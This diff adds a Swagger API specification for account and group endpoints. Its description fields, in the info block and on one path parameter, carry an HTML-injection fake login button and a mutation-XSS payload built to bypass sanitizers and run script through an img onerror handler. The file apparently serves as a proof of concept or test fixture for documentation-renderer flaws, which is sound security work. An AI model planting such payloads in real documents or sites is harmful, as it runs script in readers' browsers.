@@ -1,0 +1,89 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: <h1>HTML injection</h1><a href=http://localhost><br><input type=button value="Login"></a><br/><br/><h1>Cross Site Scripting (XSS)</h1><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=javascript:alert(document.domain) src=1>"></form>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=javascript:alert(document.domain) src=1>"></form>
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: deleteGroupById
+      summary: Deletes a group by id
+    get:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findGroupsById
+      summary: Finds groups by id
+    post:
+      parameters:
+        - description: Id value to filter by
+          in: path
+          name: id
+          required: true
+          type: string
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      description: 'You cannot create an LDAP group with a POST.  '
+      operationId: createGroupById
+      summary: Creates a new group by id
+    put:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      description: You cannot change information for an LDAP group with a PUT.
+      operationId: updateGroupById
+      summary: Updates an existing group by id
